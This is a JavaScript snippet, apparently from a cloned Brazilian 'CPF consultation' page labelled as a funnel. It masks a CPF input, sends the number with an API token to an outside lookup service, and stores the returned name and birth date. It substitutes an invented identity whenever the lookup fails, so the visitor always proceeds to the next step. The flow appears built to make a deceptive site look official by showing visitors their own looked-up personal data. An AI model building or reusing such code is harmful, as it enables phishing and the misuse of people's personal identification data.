<script>
  document.addEventListener('DOMContentLoaded', function() {
    var cpfInput = document.getElementById('cpf');
    var form = document.querySelector('form');
    var btn = document.getElementById('btn-consultar');
    
    // Máscara de CPF
    cpfInput.addEventListener('input', function(e) {
      var value = e.target.value.replace(/\D/g, '');
      if (value.length > 11) value = value.slice(0, 11);
      
      if (value.length > 9) {
        value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
      } else if (value.length > 6) {
        value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
      } else if (value.length > 3) {
        value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
      }
      e.target.value = value;
    });

    // Submissão do formulário
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      var rawCpf = cpfInput.value.replace(/\D/g, '');
      
      if (rawCpf.length !== 11) {
        alert("Informe os 11 dígitos do CPF.");
        return;
      }
      
      // Salvar CPF na sessão como o React original fazia
      sessionStorage.setItem('funil:cpf', rawCpf);
      
      // Efeito de carregamento no botão
      btn.innerHTML = '<svg class="size-5 animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg> Consultando...';
      btn.disabled = true;
      
      // Chamar API real para consultar CPF
      fetch(`https://searchapi.it.com/consulta?cpf=${rawCpf}&token_api=2077`)
        .then(function(res) { return res.json(); })
        .then(function(data) {
          if (data.status === 200 && data.dados && data.dados.length > 0) {
            sessionStorage.setItem('funil:dados', JSON.stringify(data.dados[0]));
          } else {
            // Fallback se não encontrar
            sessionStorage.setItem('funil:dados', JSON.stringify({ NOME: "MARIA DAS GRAÇAS SOUZA", NASC: "12/04/1985", CPF: rawCpf }));
          }
          window.location.href = 'consulte/2?cpf=' + rawCpf;
        })
        .catch(function(e) {
          // Fallback em caso de erro na API
          sessionStorage.setItem('funil:dados', JSON.stringify({ NOME: "MARIA DAS GRAÇAS SOUZA", NASC: "12/04/1985", CPF: rawCpf }));
          window.location.href = 'consulte/2?cpf=' + rawCpf;
        });
    });
  });
</script>
